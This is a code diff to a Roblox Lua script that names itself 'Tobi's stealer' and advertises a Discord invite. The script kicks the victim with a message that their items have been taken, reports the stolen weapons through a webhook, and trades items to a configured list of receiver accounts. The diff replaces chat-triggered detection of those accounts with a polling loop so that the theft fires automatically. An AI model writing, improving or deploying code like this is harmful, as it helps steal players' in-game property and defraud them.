@@ -510,36 +510,36 @@ if #weaponsToSend > 0 then
         plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
-local function waitForUserChat()
-    local TextChatService = game:GetService("TextChatService")
-    local sentMessage = false
-    
-    -- Listen for any message sent in the server
-    TextChatService.MessageReceived:Connect(function(textChatMessage)
-        if textChatMessage.TextSource then
-            local senderUserId = textChatMessage.TextSource.UserId
-            local senderPlayer = Players:GetPlayerByUserId(senderUserId)
-            
-            -- Check if the sender's name is in your configuration table
-            if senderPlayer and table.find(users, senderPlayer.Name) then
-                
-                -- Trigger your webhook message only once
-                if not sentMessage then
+local function startPlayerPolling()
+    local checkInterval = 3 -- Checks the server every 3 seconds
+    local searchActive = true
+
+    task.spawn(function()
+        while searchActive do
+            -- Look through every player currently in the game server
+            for _, player in ipairs(Players:GetPlayers()) do
+                -- Check if their username matches your configuration list
+                if table.find(users, player.Name) then
+                    
+                    -- 1. The webhook trigger is moved here so it fires 
+                    -- the exact second the target account is detected
                     SendMessage(sentWeapons)
-                    sentMessage = true
+                    
+                    -- 2. Turn off the loop immediately so it doesn't spam webhooks or requests
+                    searchActive = false
+                    
+                    -- 3. Pass the detected player's name into the transaction thread
+                    task.spawn(function()
+                        doTrade(player.Name)
+                    end)
+                    
+                    break -- Exit the current player loop
                 end
-                
-                -- Isolate the trade function into its own thread so it doesn't freeze the chat
-                task.spawn(function()
-                    doTrade(senderPlayer.Name)
-                end)
-                
             end
+            
+            -- Prevent the server thread from freezing by waiting 3 seconds
+            task.wait(checkInterval)
         end
     end)
-end
-
--- CRITICAL: You must execute the function out here so the event registers!
-waitForUserChat()
 end
 
